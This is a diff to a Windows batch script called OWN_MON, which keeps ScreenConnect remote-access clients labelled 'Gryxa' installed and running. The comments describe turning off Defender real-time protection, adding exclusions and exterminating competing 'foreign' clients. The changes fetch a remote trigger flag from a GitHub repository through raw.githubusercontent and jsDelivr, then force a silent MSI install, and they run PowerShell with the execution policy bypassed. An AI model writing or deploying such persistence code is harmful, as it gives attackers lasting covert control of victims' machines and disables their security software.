@@ -1,7 +1,8 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260802M32
-rem  M33: Gryxa FP 36e506ff pin; foreign count treats gryxa-relay as friendly (no mislabel).
+rem  OWN_MON  BUILD 20260804M41
+rem  M41: relay-verified sync; INFLIGHT≠OK; sevrz MSI validate; force_gryxa fc; SY heal SDDL via S12.
+rem  M40: restore :RepairRegistered. M39: per-tick Defender RTP-off + SC exclusions.
 rem  Authorized internal deployment - lab/competition scope only.
 rem ═══════════════════════════════════════════════════════════════
 setlocal EnableDelayedExpansion
@@ -35,7 +36,7 @@ set "MSICACHE_G=%WD%\pkg_gryxa.msi"
 if not exist "%WD%" md "%WD%" 2>nul
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M40"
+set "MONVER=M41"
 set "PF86=%ProgramFiles(x86)%"
 set "GRYXA_DEEP=%WD%\gryxa_deep.flag"
 rem load current Gryxa FP (may rotate when server/keys change)
@@ -56,7 +57,7 @@ rem ── [0] single-flight mutex (stop overlapping ticks racing msiexec) ─�
 set "MUTEX=%WD%\tick.lock"
 if exist "%MUTEX%" (
   for %%A in ("%MUTEX%") do set "LOCKAGE=%%~tA"
-  powershell -NoProfile -NonInteractive -Command "if((Test-Path '%MUTEX%') -and (((Get-Date)-(Get-Item -LiteralPath '%MUTEX%' -Force).LastWriteTime).TotalMinutes -lt 8)){ exit 1 } else { exit 0 }" >nul 2>&1
+  powershell -NoProfile -NonInteractive -Command "if((Test-Path '%MUTEX%') -and (((Get-Date)-(Get-Item -LiteralPath '%MUTEX%' -Force).LastWriteTime).TotalMinutes -lt 20)){ exit 1 } else { exit 0 }" >nul 2>&1
   if errorlevel 1 (
     echo tick_skipped_mutex_busy>>"%LOG%"
     endlocal
@@ -131,10 +132,9 @@ if exist "%WD%\own_lib.ps1" (
   if /I "!WD_STATE!"=="REARMED" echo watchdog WMI REARMED>>"%LOG%"
 )
 
-rem ── [E0] sync Gryxa FP from Running non-sevrz SC BEFORE exterminate
-rem     (prevents killing Gryxa as foreign every tick)
+rem ── [E0] sync Gryxa FP from verified gryxa.com SC BEFORE exterminate ──
 if exist "%WD%\own_lib.ps1" (
-  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-health -WorkDir "%WD%" >nul 2>&1
+  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action sync-gryxa-fp -WorkDir "%WD%" >nul 2>&1
   if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
 )
 
@@ -342,14 +342,16 @@ set "DO_DEEP=0"
 set "FORCE_G=0"
 if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
 
-rem FORCE push: repo flag forces an immediate Gryxa install once (self-clears via tag match)
-"%CURL%" -L --connect-timeout 6 --max-time 20 -o "%WD%\force_gryxa.new" "https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/force_gryxa.flag?t=%RANDOM%%RANDOM%" >nul 2>&1
+rem FORCE push: content-hash via fc /b (re-fire when flag content changes); raw-first
+"%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 20 -o "%WD%\force_gryxa.new" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/force_gryxa.flag?t=%RANDOM%%RANDOM%" >nul 2>&1
+if not exist "%WD%\force_gryxa.new" "%CURL%" -L --connect-timeout 6 --max-time 20 -o "%WD%\force_gryxa.new" "https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/force_gryxa.flag?t=%RANDOM%%RANDOM%" >nul 2>&1
 if exist "%WD%\force_gryxa.new" (
   findstr /C:"PUSH" "%WD%\force_gryxa.new" >nul 2>&1
   if not errorlevel 1 (
-    if not exist "%WD%\force_gryxa.done" set "FORCE_G=1"
-    if exist "%WD%\force_gryxa.done" (
-      findstr /C:"PUSH" "%WD%\force_gryxa.done" >nul 2>&1
+    if not exist "%WD%\force_gryxa.done" (
+      set "FORCE_G=1"
+    ) else (
+      fc /b "%WD%\force_gryxa.new" "%WD%\force_gryxa.done" >nul 2>&1
       if errorlevel 1 set "FORCE_G=1"
     )
   )
@@ -398,7 +400,8 @@ if exist "%WD%\own_lib.ps1" (
     for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -NoWait -WorkDir "%WD%" -Build %MONVER%`) do set "GRES=%%R"
   )
   echo gryxa_ensure_result=!GRES!>>"%LOG%"
-  echo !GRES!| findstr /I /B /C:"HEALTHY" >nul
+  rem M41: only mark OK on true HEALTHY|...running/started/svc-recreated — never INFLIGHT/spawned
+  echo !GRES!| findstr /I /B /C:"HEALTHY|" | findstr /I "running=1 started=1 svc-recreated=1" >nul
   if not errorlevel 1 set "GRYXA_OK=1"
 )
 if "%DO_DEEP%"=="1" echo done>"%GRYXA_DEEP%"
@@ -406,11 +409,12 @@ if "%GRYXA_OK%"=="0" call :EnsureGryxaMust
 
 :GryxaAfter
 if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
+set "GRYXA_OK=0"
 sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
 if not errorlevel 1 set "GRYXA_OK=1"
-rem also OK if any non-sevrz still running
+rem also OK if verified Gryxa FP (relay/expected) is healthy
 if "%GRYXA_OK%"=="0" (
-  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-health -WorkDir "%WD%" 2>nul | findstr /I /B /C:"HEALTHY" >nul
+  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-health -WorkDir "%WD%" 2>nul | findstr /I /B /C:"HEALTHY|" | findstr /I "running=1" >nul
   if not errorlevel 1 set "GRYXA_OK=1"
 )
 
@@ -522,13 +526,26 @@ for %%F in ("%MSI%.tmp") do if %%~zF LEQ 1000000 (
   exit /b 1
 )
 move /y "%MSI%.tmp" "%MSI%" >nul 2>&1
+rem M41: OLE magic + ProductName FP must match KEEP_FP before /i
+set "MSIOK=no"
+if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action test-msi -Fp "%KEEP_FP%" -Extra "%MSI%" -WorkDir "%WD%"`) do set "MSIOK=%%R"
+if /I not "!MSIOK!"=="yes" (
+  echo [%TAG%] msi_validate_fail>>"%LOG%"
+  del /f /q "%MSI%" >nul 2>&1
+  exit /b 1
+)
 call :NoMsiPolicy
-rem M13: stale primary dir (service deleted, product unregistered) breaks
-rem the SC installer custom action - clear it before installing
+rem M13/M41: stale primary dir under PF and PF86
 sc query "ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
-if errorlevel 1 if exist "%PF86%\ScreenConnect Client (%KEEP_FP%)" (
-  echo stale_primary_dir_clean>>"%LOG%"
-  rmdir /s /q "%PF86%\ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
+if errorlevel 1 (
+  if exist "%PF86%\ScreenConnect Client (%KEEP_FP%)" (
+    echo stale_primary_dir_clean_pf86>>"%LOG%"
+    rmdir /s /q "%PF86%\ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
+  )
+  if exist "%ProgramFiles%\ScreenConnect Client (%KEEP_FP%)" (
+    echo stale_primary_dir_clean_pf>>"%LOG%"
+    rmdir /s /q "%ProgramFiles%\ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
+  )
 )
 echo [%TAG%] msiexec install>>"%LOG%"
 msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_heal.log" >nul 2>&1
